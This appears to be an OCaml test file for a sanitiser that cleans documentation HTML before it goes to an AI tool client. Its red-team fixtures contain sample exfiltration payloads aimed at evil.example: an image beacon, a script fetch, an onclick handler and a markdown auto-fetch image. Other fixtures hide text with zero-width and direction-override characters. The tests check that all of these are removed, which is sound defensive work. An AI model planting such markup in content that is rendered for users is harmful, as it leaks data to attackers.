(* Tests for the Block B doc-HTML hardening (issue #3775): the single-pass
   sanitiser/reference-extractor. Includes red-team fixtures for the
   exfiltration / prompt-injection surface. *)

module M = Ocamlorg_web.Mcp_doc_html

(* Transform as if we are on dream's Dream module page, so relative hrefs
   resolve the way they do in production. *)
let run ?(package = "dream") ?(version = "1.0.0~alpha8")
    ?(path = "dream/Dream/index.html") ?max_bytes html =
  M.transform ?max_bytes ~package ~version ~path ~html ()

let contains ~needle s =
  let ln = String.length needle and n = String.length s in
  let rec go i = i + ln <= n && (String.sub s i ln = needle || go (i + 1)) in
  ln = 0 || go 0

let body html = (run html).body
let refs html = (run html).references

(* --- red team: active markup must not survive in the body --- *)

let no_active_markup () =
  let html =
    "<p>Real docs.\n\
     <img src=\"https://evil.example/x?d=LEAK\">\n\
     <script>fetch('https://evil.example/s')</script>\n\
     <a href=\"https://evil.example/phish\" onclick=\"steal()\">click</a></p>"
  in
  let b = body html in
  Alcotest.(check bool) "no <img" false (contains ~needle:"<img" b);
  Alcotest.(check bool) "no <script" false (contains ~needle:"<script" b);
  Alcotest.(check bool) "no src=" false (contains ~needle:"src=" b);
  Alcotest.(check bool) "no href=" false (contains ~needle:"href=" b);
  Alcotest.(check bool) "no onclick" false (contains ~needle:"onclick" b);
  Alcotest.(check bool)
    "no evil host" false
    (contains ~needle:"evil.example/s" b);
  (* the visible link text is kept in the prose *)
  Alcotest.(check bool) "keeps link text" true (contains ~needle:"click" b)

let script_text_dropped () =
  (* text inside a dropped subtree must not leak into the body *)
  let b = body "<div>keep<script>SECRET_PAYLOAD()</script>me</div>" in
  Alcotest.(check bool)
    "script body gone" false
    (contains ~needle:"SECRET_PAYLOAD" b);
  Alcotest.(check bool) "surrounding kept" true (contains ~needle:"keep" b)

let markdown_image_defanged () =
  (* odoc passes literal markdown through as text; a client rendering the tool
     output as markdown would revive [![x](url)] into an auto-fetched image. The
     "](" join must be broken. *)
  let b = body "<p>see ![pwn](https://evil.example/x)</p>" in
  Alcotest.(check bool) "no ]( join" false (contains ~needle:"](" b)

let angle_autolink_defanged () =
  let b = body "<p>ref &lt;https://evil.example/x&gt; here</p>" in
  Alcotest.(check bool) "no <http autolink" false (contains ~needle:"<http" b)

let literal_tag_escaped () =
  (* A tag that was an entity in the source (odoc code/prose about HTML),
     decoded by the parser, must be re-escaped so no raw tag reaches a Markdown
     renderer. *)
  let b = body "<p>Dream.html_escape protects &lt;script&gt; tags.</p>" in
  Alcotest.(check bool) "no raw <script" false (contains ~needle:"<script" b);
  Alcotest.(check bool)
    "escaped form present" true
    (contains ~needle:"&lt;script&gt;" b)

let invisible_stripped () =
  (* U+200B zero-width space, U+202E RLO, a C0 control, U+FEFF BOM: hidden-text
     smuggling vectors that must not survive. *)
  let b = body "<p>ig\xe2\x80\x8bnore\xe2\x80\xae\x07 me\xef\xbb\xbf</p>" in
  Alcotest.(check bool)
    "no zero-width" false
    (contains ~needle:"\xe2\x80\x8b" b);
  Alcotest.(check bool)
    "no RLO override" false
    (contains ~needle:"\xe2\x80\xae" b);
  Alcotest.(check bool) "no BOM" false (contains ~needle:"\xef\xbb\xbf" b);
  Alcotest.(check bool) "no C0 control" false (contains ~needle:"\x07" b);
  Alcotest.(check bool) "visible text kept" true (contains ~needle:"ignore" b)

let sanitize_field_test () =
  (* Free-text overview fields (synopsis/description) get the same treatment. *)
  let s =
    M.sanitize_field
      "hi <script>x</script> ![a](http://e/x) zero\xe2\x80\x8bwidth"
  in
  Alcotest.(check bool) "escaped tag" false (contains ~needle:"<script" s);
  Alcotest.(check bool) "defanged join" false (contains ~needle:"](" s);
  Alcotest.(check bool)
    "zero-width gone" false
    (contains ~needle:"\xe2\x80\x8b" s)

(* --- reference extraction & cross-dependency navigation --- *)

let is_module ~pkg ~ver ~path ?fragment r =
  match r with
  | M.Module m ->
      m.package = pkg && m.version = ver && m.path = path
      && m.fragment = fragment
  | _ -> false

let cross_package_ref () =
  let html =
    "<a \
     href=\"../../../../../caqti-lwt/2.3.2/doc/caqti-lwt/Caqti_lwt/index.html#type-connection\">Caqti_lwt</a>"
  in
  let found =
    List.exists
      (is_module ~pkg:"caqti-lwt" ~ver:"2.3.2"
         ~path:"caqti-lwt/Caqti_lwt/index.html" ~fragment:"type-connection")
      (refs html)
  in
  Alcotest.(check bool) "cross-package coords extracted" true found

let same_package_ref () =
  let html = "<a href=\"../Lwt_unix/index.html\">Lwt_unix</a>" in
  let found =
    List.exists
      (is_module ~pkg:"dream" ~ver:"1.0.0~alpha8"
         ~path:"dream/Lwt_unix/index.html" ?fragment:None)
      (refs html)
  in
  Alcotest.(check bool) "same-package coords" true found

let universe_ref () =
  let html = "<a href=\"/u/abc123/foo/1.0/doc/foo/Foo/index.html\">Foo</a>" in
  let found =
    List.exists
      (is_module ~pkg:"foo" ~ver:"1.0" ~path:"foo/Foo/index.html" ?fragment:None)
      (refs html)
  in
  Alcotest.(check bool) "universe-form parsed to (pkg,ver,path)" true found

let source_ref () =
  let html =
    "<a \
     href=\"../../../../../dream-pure/1.0.0~alpha2/doc/src/dream-pure/formats.ml.html#val-x\">src</a>"
  in
  let found =
    List.exists
      (function
        | M.Source s ->
            s.package = "dream-pure" && s.version = "1.0.0~alpha2"
            && s.path = "src/dream-pure/formats.ml.html"
        | _ -> false)
      (refs html)
  in
  Alcotest.(check bool) "source page classified as Source" true found

let external_ref () =
  let html = "<a href=\"https://github.com/aantron/dream\">repo</a>" in
  let found =
    List.exists
      (function
        | M.External e -> e.url = "https://github.com/aantron/dream"
        | _ -> false)
      (refs html)
  in
  Alcotest.(check bool) "external kept as inert url" true found

let fragment_ref () =
  let html = "<a href=\"#val-bind\">bind</a>" in
  let found =
    List.exists
      (function M.Anchor a -> a.fragment = "val-bind" | _ -> false)
      (refs html)
  in
  Alcotest.(check bool) "fragment -> anchor" true found

let dedup () =
  let html =
    "<a href=\"#val-bind\">bind</a> and again <a href=\"#val-bind\">bind</a>"
  in
  let n =
    List.length
      (List.filter
         (function M.Anchor a -> a.fragment = "val-bind" | _ -> false)
         (refs html))
  in
  Alcotest.(check int) "deduped to one" 1 n

(* --- structure & caps --- *)

let code_block_preserved () =
  let b = body "<pre>val bind : 'a t -> ('a -> 'b t) -> 'b t</pre>" in
  Alcotest.(check bool) "fenced" true (contains ~needle:"```" b);
  Alcotest.(check bool) "signature kept" true (contains ~needle:"val bind :" b)

let truncation () =
  let big = "<p>" ^ String.make 5000 'x' ^ "</p>" in
  let r = run ~max_bytes:500 big in
  Alcotest.(check bool) "flagged truncated" true r.truncated;
  Alcotest.(check bool) "body bounded" true (String.length r.body <= 600);
  Alcotest.(check bool) "has marker" true (contains ~needle:"truncated" r.body)

let refs_cap () =
  let links =
    String.concat ""
      (List.init 10 (fun i -> Printf.sprintf "<a href=\"#a%d\">x</a>" i))
  in
  let r =
    M.transform ~max_refs:3 ~package:"p" ~version:"1" ~path:"p/M.html"
      ~html:links ()
  in
  Alcotest.(check int) "capped to max_refs" 3 (List.length r.references);
  Alcotest.(check bool) "flags references_truncated" true r.references_truncated

let oversized_input () =
  let huge = String.make 3_000_000 'x' in
  let r =
    M.transform ~max_input:2_000_000 ~package:"a" ~version:"1" ~path:"a/A.html"
      ~html:huge ()
  in
  Alcotest.(check bool) "refused" true r.truncated;
  Alcotest.(check (list (of_pp (fun _ _ -> ())))) "no refs" [] r.references

let () =
  Alcotest.run "mcp_doc_html"
    [
      ( "sanitisation",
        [
          Alcotest.test_case "no active markup" `Quick no_active_markup;
          Alcotest.test_case "dropped subtree text gone" `Quick
            script_text_dropped;
          Alcotest.test_case "markdown image defanged" `Quick
            markdown_image_defanged;
          Alcotest.test_case "angle autolink defanged" `Quick
            angle_autolink_defanged;
          Alcotest.test_case "literal tag escaped" `Quick literal_tag_escaped;
          Alcotest.test_case "invisible chars stripped" `Quick
            invisible_stripped;
          Alcotest.test_case "sanitize_field" `Quick sanitize_field_test;
        ] );
      ( "references",
        [
          Alcotest.test_case "cross-package" `Quick cross_package_ref;
          Alcotest.test_case "same-package" `Quick same_package_ref;
          Alcotest.test_case "universe form" `Quick universe_ref;
          Alcotest.test_case "source page" `Quick source_ref;
          Alcotest.test_case "external" `Quick external_ref;
          Alcotest.test_case "fragment" `Quick fragment_ref;
          Alcotest.test_case "dedup" `Quick dedup;
        ] );
      ( "structure & caps",
        [
          Alcotest.test_case "code block" `Quick code_block_preserved;
          Alcotest.test_case "truncation" `Quick truncation;
          Alcotest.test_case "references cap flagged" `Quick refs_cap;
          Alcotest.test_case "oversized input" `Quick oversized_input;
        ] );
    ]
